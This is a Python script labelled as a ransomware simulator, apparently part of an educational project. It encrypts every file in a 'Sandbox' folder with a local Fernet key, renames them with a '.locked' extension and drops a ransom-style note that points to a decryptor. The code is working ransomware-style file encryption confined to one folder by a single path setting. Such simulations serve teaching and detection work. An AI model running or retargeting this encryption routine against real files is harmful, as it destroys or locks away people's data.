import os
from cryptography.fernet import Fernet

# 1. Find all files to encrypt in the Sandbox folder
files_to_encrypt = []
target_folder = "Sandbox"

for dirpath, dirnames, filenames in os.walk(target_folder):
    for filename in filenames:
        # Skip important project files
        if filename in ["ransomware_simulator.py", "thekey.key", "decryptor.py", "detector.py"]:
            continue
        file_path = os.path.join(dirpath, filename)
        files_to_encrypt.append(file_path)

# 2. Load the encryption key
with open("thekey.key", "rb") as key_file:
    secret_key = key_file.read()

fernet_tool = Fernet(secret_key)

# 3. Encrypt files
for file_path in files_to_encrypt:
    with open(file_path, "rb") as file:
        original_content = file.read()

    encrypted_content = fernet_tool.encrypt(original_content)

    with open(file_path, "wb") as file:
        file.write(encrypted_content)

    # Rename file with .locked extension
    os.rename(file_path, file_path + ".locked")

# 4. Create a ransom note
note_path = os.path.join(target_folder, "NOTE_PLEASE_READ.txt")
with open(note_path, "w") as note:
    note.write("Your files have been safely encrypted for simulation purposes.\nUse decryptor.py to restore them.")

print("Ransomware simulation complete. Check the 'Sandbox' folder.")
